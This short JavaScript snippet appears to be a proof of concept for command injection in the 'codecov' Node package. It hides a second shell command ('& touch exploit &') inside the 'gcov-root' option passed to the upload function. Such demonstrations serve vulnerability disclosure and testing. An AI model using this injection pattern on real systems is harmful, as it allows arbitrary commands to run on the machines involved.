var root = require("codecov");
var args = {
  "options": {
    'gcov-root': "& touch exploit &",
    'gcov-exec': ' ',
    'gcov-args': ' '
  }
}
root.handleInput.upload(args, function(){}, function(){});
